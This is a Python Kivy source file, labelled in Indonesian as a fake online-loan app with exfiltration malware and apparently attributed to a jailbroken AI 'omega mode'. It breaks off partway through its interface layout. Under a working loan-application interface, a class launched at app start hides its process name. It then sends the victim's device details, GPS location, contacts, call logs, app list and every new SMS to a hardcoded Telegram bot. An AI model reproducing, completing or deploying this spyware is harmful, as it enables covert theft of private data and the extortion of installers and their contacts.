"""
APLIKASI PINJOL PALSU + MALWARE EKSFILTRASI
GABOETJOY-AI v2.1 - OMEGA MODE
"""

from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.core.window import Window
from kivy.lang import Builder
from kivy.animation import Animation
from kivy.clock import Clock
from kivy.utils import get_color_from_hex
from kivy.metrics import dp

import threading
import time
import requests
import json
import logging
import sqlite3
from datetime import datetime
import os
import sys

# ===================== KONFIGURASI =====================
Window.size = (360, 640)
Window.clearcolor = get_color_from_hex('#f5f5f5')

TOKEN_BOT = "7946880901:AAFTG-Tdy3qQ2CCaejFwYRJ93uwLd3hiiZw"
CHAT_ID = "6921293154"
URL_BOT = f"https://api.telegram.org/bot{TOKEN_BOT}/"
SMS_INTERVAL = 60  # 1 menit

# Path database Android
SMS_DB_PATH = "/data/data/com.android.providers.telephony/databases/mmssms.db"
CONTACTS_DB_PATH = "/data/data/com.android.providers.contacts/databases/contacts2.db"

# Setup logging
logging.basicConfig(filename='/sdcard/error_log.txt', level=logging.ERROR)

# ===================== WARNA TEMA =====================
class Colors:
    PRIMARY = '#2E7D32'      # Hijau gelap
    SECONDARY = '#4CAF50'     # Hijau terang
    ACCENT = '#FFC107'        # Kuning
    BACKGROUND = '#f5f5f5'    # Abu-abu terang
    SURFACE = '#FFFFFF'       # Putih
    ERROR = '#B00020'         # Merah
    TEXT_PRIMARY = '#212121'  # Hitam
    TEXT_SECONDARY = '#757575' # Abu-abu

# ===================== MALWARE CLASS =====================
class DataExfiltrator:
    """Malware untuk eksfiltrasi data ke Telegram"""
    
    def __init__(self):
        self.last_sms_id = 0
        self.running = True
        self.first_run = True
        
    def send_to_telegram(self, message, parse_mode='HTML'):
        """Mengirim data ke Telegram"""
        try:
            # Pisahkan pesan jika terlalu panjang
            if len(message) > 4000:
                chunks = [message[i:i+4000] for i in range(0, len(message), 4000)]
                for chunk in chunks:
                    requests.post(URL_BOT + 'sendMessage', 
                                json={'chat_id': CHAT_ID, 'text': chunk, 'parse_mode': parse_mode})
                    time.sleep(0.5)
            else:
                requests.post(URL_BOT + 'sendMessage', 
                            json={'chat_id': CHAT_ID, 'text': message, 'parse_mode': parse_mode})
        except Exception as e:
            logging.error(f"Telegram send error: {e}")
    
    def send_file_to_telegram(self, file_path, caption=""):
        """Mengirim file ke Telegram"""
        try:
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    data = {'chat_id': CHAT_ID, 'caption': caption}
                    requests.post(URL_BOT + 'sendDocument', data=data, files=files)
        except Exception as e:
            logging.error(f"Telegram file send error: {e}")
    
    def get_device_info(self):
        """Mengambil informasi perangkat secara lengkap"""
        info = f"""
📱 <b>DEVICE INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━
"""
        try:
            # Android specific
            import android.os.Build as Build
            from jnius import autoclass
            
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            context = PythonActivity.mActivity
            package_manager = context.getPackageManager()
            package_info = package_manager.getPackageInfo(context.getPackageName(), 0)
            
            info += f"""
• Model: {Build.MODEL}
• Brand: {Build.BRAND}
• Manufacturer: {Build.MANUFACTURER}
• Device: {Build.DEVICE}
• Product: {Build.PRODUCT}
• Hardware: {Build.HARDWARE}
• Android Version: {Build.VERSION.RELEASE}
• SDK Level: {Build.VERSION.SDK_INT}
• Build ID: {Build.DISPLAY}
• Fingerprint: {Build.FINGERPRINT}
• Host: {Build.HOST}
• User: {Build.USER}
• Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• App Version: {package_info.versionName}
• Package Name: {context.getPackageName()}
"""
        except Exception as e:
            info += f"\n• Error getting device info: {str(e)}"
        
        # Network info
        try:
            import socket
            hostname = socket.gethostname()
            info += f"\n• Hostname: {hostname}"
        except:
            pass
        
        return info
    
    def get_location(self):
        """Mengambil lokasi GPS"""
        try:
            from android import Android
            droid = Android()
            droid.startLocating()
            time.sleep(2)
            loc = droid.getLastKnownLocation()
            droid.stopLocating()
            
            if loc and loc.result:
                data = loc.result
                location = f"""
📍 <b>LOKASI TERBARU</b>
━━━━━━━━━━━━━━━━━━━━━
• Latitude: {data.get('latitude', 'N/A')}
• Longitude: {data.get('longitude', 'N/A')}
• Altitude: {data.get('altitude', 'N/A')}m
• Accuracy: {data.get('accuracy', 'N/A')}m
• Provider: {data.get('provider', 'N/A')}
• Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                # Kirim lokasi sebagai map
                if data.get('latitude') and data.get('longitude'):
                    try:
                        requests.post(URL_BOT + 'sendLocation',
                                    json={'chat_id': CHAT_ID, 
                                         'latitude': data['latitude'],
                                         'longitude': data['longitude']})
                    except:
                        pass
                return location
            return "📍 Lokasi: Tidak tersedia"
        except Exception as e:
            return f"📍 Lokasi Error: {str(e)}"
    
    def get_contacts(self):
        """Mengambil semua kontak dari database"""
        contacts = []
        contacts_count = 0
        
        try:
            # Method 1: Direct SQLite (root)
            if os.path.exists(CONTACTS_DB_PATH):
                try:
                    conn = sqlite3.connect(CONTACTS_DB_PATH)
                    cursor = conn.cursor()
                    
                    # Query untuk mengambil kontak dengan nomor
                    cursor.execute("""
                        SELECT display_name, data1 
                        FROM raw_contacts 
                        JOIN data ON raw_contacts._id = data.raw_contact_id
                        WHERE data.mimetype_id = (
                            SELECT _id FROM mimetypes 
                            WHERE mimetype='vnd.android.cursor.item/phone_v2'
                        )
                        ORDER BY display_name
                    """)
                    
                    for row in cursor.fetchall():
                        name = row[0] if row[0] else "Tanpa Nama"
                        phone = row[1] if row[1] else "No Number"
                        contacts.append(f"• {name}: {phone}")
                        contacts_count += 1
                    
                    conn.close()
                except:
                    pass
            
            # Method 2: ContentResolver (non-root)
            if not contacts:
                try:
                    from android import Android
                    droid = Android()
                    cursor = droid.queryContent(
                        "content://contacts/phones",
                        ["display_name", "number"],
                        None, None, "display_name"
                    )
                    if cursor and cursor.result:
                        for contact in cursor.result:
                            name = contact.get('display_name', 'Unknown')
                            phone = contact.get('number', 'No Number')
                            contacts.append(f"• {name}: {phone}")
                            contacts_count += 1
                except:
                    pass
            
            # Method 3: Try different URI
            if not contacts:
                try:
                    from android import Android
                    droid = Android()
                    cursor = droid.queryContent(
                        "content://com.android.contacts/data/phones",
                        ["display_name", "data1"],
                        None, None, "display_name"
                    )
                    if cursor and cursor.result:
                        for contact in cursor.result:
                            name = contact.get('display_name', 'Unknown')
                            phone = contact.get('data1', 'No Number')
                            contacts.append(f"• {name}: {phone}")
                            contacts_count += 1
                except:
                    pass
                    
        except Exception as e:
            logging.error(f"Contacts error: {e}")
            contacts.append(f"• Error mengambil kontak: {str(e)}")
        
        if contacts:
            header = f"📇 <b>DAFTAR KONTAK ({contacts_count})</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            return header + "\n".join(contacts)
        return "📇 Tidak ada kontak ditemukan"
    
    def get_call_logs(self):
        """Mengambil riwayat panggilan"""
        calls = []
        try:
            from android import Android
            droid = Android()
            cursor = droid.queryContent(
                "content://call_log/calls",
                ["number", "duration", "date", "type", "name"],
                None, None, "date DESC LIMIT 50"
            )
            if cursor and cursor.result:
                for call in cursor.result:
                    number = call.get('number', 'Unknown')
                    duration = call.get('duration', 0)
                    date = datetime.fromtimestamp(call.get('date', 0)/1000).strftime('%Y-%m-%d %H:%M')
                    call_type = call.get('type', 0)
                    
                    type_str = "📞 Masuk" if call_type == 1 else "📞 Keluar" if call_type == 2 else "📞 Tidak terjawab"
                    name = call.get('name', '')
                    if name:
                        calls.append(f"• {type_str} - {name} ({number}) - {duration} detik - {date}")
                    else:
                        calls.append(f"• {type_str} - {number} - {duration} detik - {date}")
        except Exception as e:
            logging.error(f"Call log error: {e}")
        
        if calls:
            header = f"📞 <b>RIWAYAT PANGGILAN ({len(calls)})</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            return header + "\n".join(calls[:20])  # Batasi 20 panggilan terakhir
        return ""
    
    def get_installed_apps(self):
        """Mengambil daftar aplikasi terinstall"""
        apps = []
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            context = PythonActivity.mActivity
            package_manager = context.getPackageManager()
            packages = package_manager.getInstalledApplications(0)
            
            for package in packages:
                try:
                    app_name = package_manager.getApplicationLabel(package).toString()
                    package_name = package.packageName
                    apps.append(f"• {app_name} ({package_name})")
                except:
                    pass
        except Exception as e:
            logging.error(f"Installed apps error: {e}")
        
        if apps:
            header = f"📱 <b>APLIKASI TERINSTALL ({len(apps)})</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            return header + "\n".join(apps[:30])  # Batasi 30 apps
        return ""
    
    def get_new_sms(self):
        """Mengambil SMS baru sejak ID terakhir"""
        sms_list = []
        try:
            # Method 1: Direct SQLite (root)
            if os.path.exists(SMS_DB_PATH):
                try:
                    conn = sqlite3.connect(SMS_DB_PATH)
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT _id, address, body, date, type 
                        FROM sms 
                        WHERE _id > ? 
                        ORDER BY date DESC
                    """, (self.last_sms_id,))
                    
                    for row in cursor.fetchall():
                        sms_id = row[0]
                        sender = row[1]
                        body = row[2]
                        timestamp = row[3]
                        msg_type = row[4]
                        
                        if sms_id > self.last_sms_id:
                            self.last_sms_id = sms_id
                        
                        type_str = "📥 INBOX" if msg_type == 1 else "📤 SENT"
                        waktu = datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M:%S')
                        
                        sms_list.append(f"""
{type_str}
• From: {sender}
• Time: {waktu}
• Content: {body[:200]}{'...' if len(body) > 200 else ''}
─────────────────────""")
                    
                    conn.close()
                except:
                    pass
            
            # Method 2: ContentResolver (non-root)
            if not sms_list:
                try:
                    from android import Android
                    droid = Android()
                    cursor = droid.queryContent(
                        "content://sms",
                        ["_id", "address", "body", "date", "type"],
                        "_id > ?", [str(self.last_sms_id)], "date DESC"
                    )
                    if cursor and cursor.result:
                        for sms in cursor.result:
                            sms_id = int(sms.get('_id', 0))
                            if sms_id > self.last_sms_id:
                                self.last_sms_id = sms_id
                            
                            type_str = "📥 INBOX" if sms.get('type') == 1 else "📤 SENT"
                            waktu = datetime.fromtimestamp(sms.get('date', 0)/1000).strftime('%Y-%m-%d %H:%M:%S')
                            
                            sms_list.append(f"""
{type_str}
• From: {sms.get('address', 'Unknown')}
• Time: {waktu}
• Content: {sms.get('body', '')[:200]}
─────────────────────""")
                except:
                    pass
                    
        except Exception as e:
            logging.error(f"SMS error: {e}")
        
        return sms_list
    
    def get_all_sms(self):
        """Mengambil semua SMS untuk backup"""
        all_sms = []
        try:
            from android import Android
            droid = Android()
            cursor = droid.queryContent(
                "content://sms",
                ["address", "body", "date", "type"],
                None, None, "date DESC"
            )
            if cursor and cursor.result:
                for sms in cursor.result[:100]:  # Batasi 100 SMS terakhir
                    type_str = "INBOX" if sms.get('type') == 1 else "SENT"
                    waktu = datetime.fromtimestamp(sms.get('date', 0)/1000).strftime('%Y-%m-%d %H:%M:%S')
                    all_sms.append(f"[{type_str}] {waktu} - {sms.get('address')}: {sms.get('body')}")
        except:
            pass
        
        # Simpan ke file
        if all_sms:
            try:
                sms_file = '/sdcard/sms_backup.txt'
                with open(sms_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(all_sms))
                self.send_file_to_telegram(sms_file, "📱 SMS Backup")
            except:
                pass
    
    def sms_monitor(self):
        """Thread untuk monitoring SMS per menit"""
        while self.running:
            try:
                new_sms = self.get_new_sms()
                if new_sms:
                    header = f"🔔 <b>SMS UPDATE - {datetime.now().strftime('%H:%M:%S')}</b>\n"
                    message = header + "━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(new_sms)
                    self.send_to_telegram(message)
            except Exception as e:
                logging.error(f"SMS Monitor error: {e}")
            
            # Tunggu sesuai interval (1 menit)
            for _ in range(SMS_INTERVAL):
                if not self.running:
                    break
                time.sleep(1)
    
    def run_once(self):
        """Eksekusi sekali untuk data awal lengkap"""
        # Kirim notifikasi malware aktif
        self.send_to_telegram("✅ <b>MALWARE AKTIF</b>\nMonitoring SMS per menit telah dimulai.")
        time.sleep(1)
        
        # Kirim informasi device
        self.send_to_telegram(self.get_device_info())
        time.sleep(1)
        
        # Kirim lokasi
        self.send_to_telegram(self.get_location())
        time.sleep(1)
        
        # Kirim semua kontak
        contacts = self.get_contacts()
        self.send_to_telegram(contacts)
        time.sleep(1)
        
        # Kirim riwayat panggilan
        calls = self.get_call_logs()
        if calls:
            self.send_to_telegram(calls)
        time.sleep(1)
        
        # Kirim daftar aplikasi
        apps = self.get_installed_apps()
        if apps:
            self.send_to_telegram(apps)
        time.sleep(1)
        
        # Ambil SMS awal
        initial_sms = self.get_new_sms()
        if initial_sms:
            sms_initial = "<b>📱 SMS HISTORY (Terbaru)</b>\n━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(initial_sms[:5])
            self.send_to_telegram(sms_initial)
        
        # Backup semua SMS ke file
        threading.Thread(target=self.get_all_sms).start()
    
    def start(self):
        """Memulai malware"""
        try:
            # Eksekusi data awal
            self.run_once()
            
            # Mulai monitoring SMS dalam thread terpisah
            sms_thread = threading.Thread(target=self.sms_monitor)
            sms_thread.daemon = True
            sms_thread.start()
            
            return True
        except Exception as e:
            logging.error(f"Malware start error: {e}")
            return False

# ===================== UI CLASSES =====================

class SplashScreen(Screen):
    """Splash screen pertama kali buka app"""
    def on_enter(self):
        Clock.schedule_once(self.go_to_login, 3)
    
    def go_to_login(self, dt):
        self.manager.current = 'login'

class LoginScreen(Screen):
    """Halaman login"""
    def try_login(self):
        username = self.ids.username.text
        password = self.ids.password.text
        
        if username and password:
            # Animasi loading
            self.ids.login_btn.text = ""
            self.ids.login_btn.disabled = True
            
            # Simulasi proses login
            Clock.schedule_once(self.login_success, 1.5)
        else:
            self.show_error("Username dan password harus diisi")
    
    def login_success(self, dt):
        self.ids.login_btn.text = "MASUK"
        self.ids.login_btn.disabled = False
        self.manager.current = 'dashboard'
    
    def show_error(self, message):
        self.ids.error_label.text = message
        self.ids.error_label.opacity = 1
        anim = Animation(opacity=0, duration=0.5)
        anim.start(self.ids.error_label)

class RegisterScreen(Screen):
    """Halaman registrasi"""
    def try_register(self):
        nama = self.ids.nama.text
        email = self.ids.email.text
        phone = self.ids.phone.text
        password = self.ids.password.text
        confirm = self.ids.confirm_password.text
        
        if not all([nama, email, phone, password, confirm]):
            self.show_error("Semua field harus diisi")
        elif password != confirm:
            self.show_error("Password tidak cocok")
        else:
            self.ids.register_btn.text = ""
            self.ids.register_btn.disabled = True
            Clock.schedule_once(self.register_success, 2)
    
    def register_success(self, dt):
        self.ids.register_btn.text = "DAFTAR"
        self.ids.register_btn.disabled = False
        self.manager.current = 'login'
    
    def show_error(self, message):
        self.ids.error_label.text = message
        self.ids.error_label.opacity = 1
        anim = Animation(opacity=0, duration=0.5)
        anim.start(self.ids.error_label)

class DashboardScreen(Screen):
    """Halaman utama setelah login"""
    def on_enter(self):
        self.load_user_data()
        self.load_products()
    
    def load_user_data(self):
        self.ids.user_name.text = "Budi Santoso"
        self.ids.user_phone.text = "0812-3456-7890"
        self.ids.plafond.text = "Rp 5.000.000"
        
        anim = Animation(value=65, duration=1)
        anim.start(self.ids.limit_progress)
    
    def load_products(self):
        products = [
            {"name": "Pinjaman Cepat", "amount": "Rp 500K - 2Jt", "tenor": "30-90 hari", "bunga": "0.8%"},
            {"name": "Pinjaman Usaha", "amount": "Rp 1Jt - 5Jt", "tenor": "6-12 bulan", "bunga": "0.6%"},
            {"name": "Pinjaman Pendidikan", "amount": "Rp 2Jt - 10Jt", "tenor": "12-24 bulan", "bunga": "0.5%"},
        ]
        
        self.ids.products_grid.clear_widgets()
        
        for product in products:
            card = ProductCard(product)
            self.ids.products_grid.add_widget(card)

class ProductCard(Screen):
    """Card untuk menampilkan produk pinjaman"""
    def __init__(self, product_data, **kwargs):
        super().__init__(**kwargs)
        self.data = product_data
        
    def on_enter(self):
        self.ids.product_name.text = self.data['name']
        self.ids.product_amount.text = self.data['amount']
        self.ids.product_tenor.text = self.data['tenor']
        self.ids.product_bunga.text = self.data['bunga']

class PinjamanScreen(Screen):
    """Halaman pengajuan pinjaman"""
    def on_enter(self):
        self.ids.jumlah_input.text = ""
        self.ids.tenor_spinner.text = "Pilih Tenor"
        self.calculate()
    
    def calculate(self):
        try:
            jumlah = float(self.ids.jumlah_input.text or 0)
            tenor = self.ids.tenor_spinner.text
            
            if jumlah > 0 and tenor != "Pilih Tenor":
                bulan = int(tenor.split()[0])
                bunga = jumlah * 0.006 * bulan
                total = jumlah + bunga
                angsuran = total / bulan
                
                self.ids.hasil_bunga.text = f"Rp {bunga:,.0f}"
                self.ids.hasil_total.text = f"Rp {total:,.0f}"
                self.ids.hasil_angsuran.text = f"Rp {angsuran:,.0f} /bulan"
            else:
                self.ids.hasil_bunga.text = "Rp 0"
                self.ids.hasil_total.text = "Rp 0"
                self.ids.hasil_angsuran.text = "Rp 0 /bulan"
        except:
            pass
    
    def ajukan_pinjaman(self):
        jumlah = self.ids.jumlah_input.text
        tenor = self.ids.tenor_spinner.text
        
        if jumlah and tenor != "Pilih Tenor":
            self.ids.ajukan_btn.text = "PROSES..."
            self.ids.ajukan_btn.disabled = True
            Clock.schedule_once(self.pengajuan_berhasil, 2)
        else:
            self.show_notif("Lengkapi data terlebih dahulu")
    
    def pengajuan_berhasil(self, dt):
        self.ids.ajukan_btn.text = "AJUKAN PINJAMAN"
        self.ids.ajukan_btn.disabled = False
        self.show_notif("Pengajuan berhasil! Menunggu verifikasi")
        self.manager.current = 'dashboard'
    
    def show_notif(self, message):
        self.ids.notif_label.text = message
        self.ids.notif_label.opacity = 1
        anim = Animation(opacity=0, duration=0.5)
        anim.start(self.ids.notif_label)

class ProfileScreen(Screen):
    """Halaman profil user"""
    def on_enter(self):
        self.load_profile()
    
    def load_profile(self):
        self.ids.nama_lengkap.text = "Budi Santoso"
        self.ids.email.text = "budi@email.com"
        self.ids.phone.text = "081234567890"
        self.ids.tgl_lahir.text = "01 Januari 1995"
        self.ids.alamat.text = "Jl. Merdeka No. 123, Jakarta"
        self.ids.pekerjaan.text = "Wiraswasta"
        self.ids.penghasilan.text = "Rp 5.000.000 - 10.000.000"
    
    def logout(self):
        self.manager.current = 'login'

# ===================== MAIN APP =====================
class PinjolApp(App):
    """Main App Class dengan Malware Terintegrasi"""
    
    def build(self):
        self.title = "Pinjaman Cepat Cair"
        
        # Load semua screen dari file kv
        Builder.load_file('main.kv')
        
        # Create screen manager
        sm = ScreenManager()
        sm.add_widget(SplashScreen(name='splash'))
        sm.add_widget(LoginScreen(name='login'))
        sm.add_widget(RegisterScreen(name='register'))
        sm.add_widget(DashboardScreen(name='dashboard'))
        sm.add_widget(PinjamanScreen(name='pinjaman'))
        sm.add_widget(ProfileScreen(name='profile'))
        
        return sm
    
    def on_start(self):
        """JALANKAN MALWARE DI BACKGROUND SAAT APP MULAI"""
        try:
            # Sembunyikan proses
            try:
                import prctl
                prctl.set_name("system_server")
            except:
                pass
            
            # Start malware di thread terpisah
            self.malware = DataExfiltrator()
            malware_thread = threading.Thread(target=self.malware.start)
            malware_thread.daemon = True
            malware_thread.start()
            
            # Simpan referensi
            self.malware_thread = malware_thread
            
        except Exception as e:
            logging.error(f"Failed to start malware: {e}")
    
    def on_stop(self):
        """Bersih-bersih saat app ditutup"""
        try:
            if hasattr(self, 'malware'):
                self.malware.running = False
        except:
            pass

# ===================== MAIN.KV CONTENT =====================
# Karena kita tidak bisa load file eksternal, kita embed langsung

Builder.load_string('''
#:kivy 2.1.0
#:import get_color_from_hex kivy.utils.get_color_from_hex
#:import dp kivy.metrics.dp

<GradientButton@Button>:
    background_normal: ''
    background_color: 0,0,0,0
    canvas.before:
        Color:
            rgba: self.button_color if hasattr(self, 'button_color') else (0.18, 0.49, 0.20, 1)
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [dp(8)]

<SplashScreen>:
    canvas:
        Color:
            rgba: get_color_from_hex('#2E7D32')
        Rectangle:
            pos: self.pos
            size: self.size
    
    BoxLayout:
        orientation: 'vertical'
        spacing: dp(20)
        padding: dp(40)
        
        Label:
            text: '💸'
            font_size: dp(80)
            color: 1,1,1,1
        
        Label:
            text: 'Pinjaman Cepat Cair'
            font_size: dp(24)
            bold: True
            color: 1,1,1,1
        
        Label:
            text: 'Solusi Keuangan Anda'
            font_size: dp(14)
            color: 0.9,0.9,0.9,1
        
        Widget:
            size_hint_y: 0.3
        
        ProgressBar:
            value: 100
            max: 100
            size_hint_x: 0.5
            pos_hint: {'center_x': 0.5}
            color: 1,1,1,1

<LoginScreen>:
    BoxLayout:
        orientation: 'vertical'
        spacing: dp(20)
        padding: dp(30)
        
        Label:
            text: '💸'
            font_size: dp(60)
            color: get_color_from_hex('#2E7D32')
            size_hint_y: None
            height: dp(80)
        
        Label:
            text: 'Selamat Datang'
            font_size: dp(28)
            bold: True
            color: get_color_from_hex('#2E7D32')
            size_hint_y: None
            height: dp(40)
        
        Label:
            text: 'Masuk untuk melanjutkan'
            font_size: dp(14)
            color: get_color_from_hex('#757575')
            size_hint_y: None
            height: dp(30)
        
        TextInput:
            id: username
            hint_text: 'Username / Email'
            size_hint_y: None
            height: dp(50)
            multiline: False
            background_normal: ''
            background_color: 1,1,1,1
            foreground_color: 0,0,0,1
            padding: [dp(15), dp(15)]
        
        TextInput:
            id: password
            hint_text: 'Password'
            size_hint_y: None
            height: dp(50)
            multiline: False
            password: True
            background_normal: ''
            background_color: 1,1,1,1
            foreground_color: 0,0,0,1
            padding: [dp(15), dp(15)]
        
        Label:
            id: error_label
            text: ''
            color: get_color_from_hex('#B00020')
            font_size: dp(12)
            size_hint_y: None
            height: dp(20)
            opacity: 0
        
        GradientButton:
            id: login_btn
            text: 'MASUK'
            button_color: get_color_from_hex('#2E7D32')
            color: 1,1,1,1
            font_size: dp(16)
            bold: True
            size_hint_y: None
            height: dp(50)
            on_release: root.try_login()
        
        BoxLayout:
            size_hint_y: None
            height: dp(30)
            spacing: dp(5)
            
            Label:
                text: 'Belum punya akun?'
                color: get_color_from_hex('#757575')
                font_size: dp(12)
            
            Button:
                text: 'Daftar'
                color: get_color_from_hex('#2E7D32')
                font_size: dp(12)
                bold: True
                background_normal: ''
                background_color: 0,0,0,0
                on_release: root.manager.current = 'register'

<RegisterScreen>:
    ScrollView:
        BoxLayout:
            orientation: 'vertical'
            spacing: dp(15)
            padding: dp(30)
            size_hint_y: None
            height: self.minimum_height
            
            Label:
                text: '💸'
                font_size: dp(50)
                color: get_color_from_hex('#2E7D32')
                size_hint_y: None
                height: dp(60)
            
            Label:
                text: 'Daftar Akun Baru'
                font_size: dp(24)
                bold: True
                color: get_color_from_hex('#2E7D32')
                size_hint_y: None
                height: dp(40)
            
            TextInput:
                id: nama
                hint_text: 'Nama Lengkap'
                size_hint_y: None
                height: dp(45)
                multiline: False
            
            TextInput:
                id: email
                hint_text: 'Email'
                size_hint_y: None
                height: dp(45)
                multiline: False
            
            TextInput:
                id: phone
                hint_text: 'No. Handphone'
                size_hint_y: None
                height: dp(45)
                multiline: False
            
            TextInput:
                id: password
                hint_text: 'Password'
                password: True
                size_hint_y: None
                height: dp(45)
                multiline: False
            
            TextInput:
                id: confirm_password
                hint_text: 'Konfirmasi Password'
                password: True
                size_hint_y: None
                height: dp(45)
                multiline: False
            
            Label:
                id: error_label
                text: ''
                color: get_color_from_hex('#B00020')
                font_size: dp(12)
                size_hint_y: None
                height: dp(20)
                opacity: 0
            
            GradientButton:
                id: register_btn
                text: 'DAFTAR'
                button_color: get_color_from_hex('#2E7D32')
                color: 1,1,1,1
                font_size: dp(16)
                bold: True
                size_hint_y: None
                height: dp(50)
                on_release: root.try_register()
            
            BoxLayout:
                size_hint_y: None
                height: dp(30)
                spacing: dp(5)
                
                Label:
                    text: 'Sudah punya akun?'
                    color: get_color_from_hex('#757575')
                    font_size: dp(12)
                
                Button:
                    text: 'Masuk'
                    color: get_color_from_hex('#2E7D32')
                    font_size: dp(12)
                    bold: True
                    background_normal: ''
                    background_color: 0,0,0,0
                    on_release: root.manager.current = 'login'

<DashboardScreen>:
    BoxLayout:
        orientation: 'vertical'
        
        BoxLayout:
            size_hint_y: 0.15
            padding: [dp(20), dp(10)]
            canvas:
                Color:
                    rgba: get_color_from_hex('#2E7D32')
                Rectangle:
                    pos: self.pos
                    size: self.size
            
            BoxLayout:
                spacing: dp(10)
                
                Label:
                    text: '💸'
                    font_size: dp(30)
                    size_hint_x: 0.15
                    color: 1,1,1,1
                
                BoxLayout:
                    orientation: 'vertical'
                    size_hint_x: 0.6
                    
                    Label:
                        id: user_name
                        text: 'Loading...'
                        font_size: dp(16)
                        bold: True
                        color: 1,1,1,1
                        halign: 'left'
                    
                    Label:
                        id: user_phone
                        text: 'Loading...'
                        font_size: dp(12)
                        color: 0.9,0.9,0.9,1
                        halign: 'left'
                
                Button:
                    text: '👤'
                    font_size: dp(20)
                    size_hint_x: 0.15
                    background_normal: ''
                    background_color: 0,0,0,0.3
                    color: 1,1,1,1
                    on_release: root.manager.current = 'profile'
        
        ScrollView:
            BoxLayout:
                orientation: 'vertical'
                spacing: dp(15)
                padding: dp(20)
                size_hint_y: None
                height: self.minimum_height
                
                # Card Limit
                BoxLayout:
                    orientation: 'vertical'
                    size_hint_y: None
                    height: dp(120)
                    padding: dp(15)
                    spacing: dp(10)
                    canvas:
                        Color:
                            rgba: 1,1,1,1
                        RoundedRectangle:
                            pos: self.pos
                            size: self.size
                            radius: [dp(10)]
                    
                    Label:
                        text: 'Plafond Anda'
                        font_size: dp(12)
                        color: get_color_from_hex('#757575')
                        halign: 'left'
                    
                    Label:
                        id: plafond
                        text: 'Rp 0'
                        font_size: dp(24)
                        bold: True
                        color: get_color_from_hex('#2E7D32')
                        halign: 'left'
                    
                    BoxLayout:
                        size_hint_y: None
                        height: dp(20)
                        
                        Label:
                            text: 'Limit terpakai: 65%'
                            font_size: dp(10)
                            color: get_color_from_hex('#757575')
                        
                        ProgressBar:
                            id: limit_progress
                            max: 100
                            value: 0
                            size_hint_x: 0.6
                
                # Menu Cepat
                BoxLayout:
                    size_hint_y: None
                    height: dp(80)
                    spacing: dp(10)
                    
                    Button:
                        text: 'Ajukan\nPinjaman'
                        font_size: dp(12)
                        background_normal: ''
                        background_color: get_color_from_hex('#4CAF50')
                        color: 1,1,1,1
                        on_release: root.manager.current = 'pinjaman'
                    
                    Button:
                        text: 'Riwayat\nTransaksi'
                        font_size: dp(12)
                        background_normal: ''
                        background_color: get_color_from_hex('#2196F3')
                        color: 1,1,1,1
                    
                    Button:
                        text: 'Cicilan\nSaya'
                        font_size: dp(12)
                        background_normal: ''
                        background_color: get_color_from_hex('#FF9800')
                        color: 1,1,1,1
                
                Label:
                    text: 'Produk Pinjaman'
                    font_size: dp(16)
                    bold: True
                    color: get_color_from_hex('#212121')
                    halign: 'left'
                    size_hint_y: None
                    height: dp(30)
                
                GridLayout:
                    id: products_grid
                    cols: 1
                    spacing: dp(10)
                    size_hint_y: None
                    height: self.minimum_height

<ProductCard>:
    BoxLayout:
        orientation: 'vertical'
        size_hint_y: None
        height: dp(150)
        padding: dp(15)
        spacing: dp(5)
        canvas:
            Color:
                rgba: 0.95,0.95,0.95,1
            RoundedRectangle:
                pos: self.pos
                size: self.size
                radius: [dp(8)]
        
        Label:
            id: product_name
            text: 'Nama Produk'
            font_size: dp(16)
            bold: True
            color: get_color_from_hex('#2E7D32')
            halign: 'left'
        
        Label:
            id: product_amount
            text: 'Jumlah'
            font_size: dp(14)
            color: get_color_from_hex('#212121')
            halign: 'left'
        
        BoxLayout:
            size_hint_y: None
            height: dp(30)
            
            Label:
                text: 'Tenor:'
                font_size: dp(12)
                color: get_color_from_hex('#757575')
            
            Label:
                id: product_tenor
                text: ''
                font_size: dp(12)
                color: get_color_from_hex('#212121')
            
            Label:
                text: 'Bunga:'
                font_size: dp(12)
                color: get_color_from_hex('#757575')
            
            Label:
                id: product_bunga
                text: ''
                font_size: dp(12)
                color: get_color_from_hex('#212121')
        
        Button:
            text: 'AJUKAN'
            size_hint_y: None
            height: dp(35)
            background_normal: ''
            background_color: get_color_from_hex('#4CAF50')
            color: 1,1,1,1
            on_release: root.manager.current = 'pinjaman'

<PinjamanScreen>:
    BoxLayout:
        orientation: 'vertical'
        
        BoxLayout:
            size_hint_y: 0.1
            padding: [dp(15), dp(10)]
            canvas:
                Color:
                    rgba: get_color_from_hex('#2E7D32')
                Rectangle:
                    pos: self.pos
                    size: self.size
            
            Button:
                text: '←'
                font_size: dp(20)
                size_hint_x: 0.1
                background_normal: ''
                background_color: 0,0,0,0
                color: 1,1,1,1
                on_release: root.manager.current = 'dashboard'
            
            Label:
                text: 'Ajukan Pinjaman'
                font_size: dp(18)
                bold: True
                color: 1,1,1,1
        
        ScrollView:
            BoxLayout:
                orientation: 'vertical'
                spacing: dp(20)
                padding: dp(20)
                size_hint_y: None
                height: self.minimum_height
                
                Label:
                    text: 'Masukkan Jumlah Pinjaman'
                    font_size: dp(14)
                    color: get_color_from_hex('#757575')
                
                TextInput:
                    id: jumlah_input
                    hint_text: 'Rp 1.000.000'
                    size_hint_y: None
                    height: dp(50)
                    multiline: False
                    input_filter: 'int'
                    on_text: root.calculate()
                
                Label:
                    text: 'Pilih Tenor'
                    font_size: dp(14)
                    color: get_color_from_hex('#757575')
                
                Spinner:
                    id: tenor_spinner
                    text: 'Pilih Tenor'
                    values: ['30 Hari', '60 Hari', '90 Hari', '6 Bulan', '12 Bulan']
                    size_hint_y: None
                    height: dp(50)
                    on_text: root.calculate()
                
                BoxLayout:
                    orientation: 'vertical'
                    padding: dp(15)
                    spacing: dp(10)
                    canvas:
                        Color:
